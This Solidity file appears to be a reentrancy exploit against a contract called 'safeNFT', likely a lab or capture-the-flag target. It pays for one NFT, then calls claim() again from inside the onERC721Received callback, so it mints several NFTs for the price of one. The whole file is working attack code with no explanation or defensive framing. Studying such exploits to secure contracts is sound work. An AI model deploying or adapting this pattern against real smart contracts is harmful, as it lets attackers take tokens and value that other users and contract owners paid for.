// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./safeNFT.sol";

contract Attack_safeNFT is IERC721Receiver {

  safeNFT public safenftcontract;
  address owner; // owner of the contract
  uint256 public totalmintednfts;
  uint256 public nftscounttobeminted;


  constructor(uint256 _nftscount, address _safenftcontractaddress) {
    owner = msg.sender;
    safenftcontract = safeNFT(_safenftcontractaddress);
    nftscounttobeminted = _nftscount;
  }
  
   function attacksafenft() external payable {
        require(msg.value == 0.1 ether, "you have to pay 0.1 ether");
        safenftcontract.buyNFT{value: msg.value}();
        safenftcontract.claim();
        totalmintednfts = safenftcontract.totalSupply();

    }

  function onERC721Received(
    address /*operator*/,
    address /*from*/,
    uint256 tokenId,
    bytes calldata /*data*/
  ) external override returns (bytes4) {
        // To claim multiple NFTs by the price of one nft only
        if (tokenId < totalmintednfts + (nftscounttobeminted-1)) {
            safenftcontract.claim();
        }
  
    return IERC721Receiver.onERC721Received.selector;
  }

}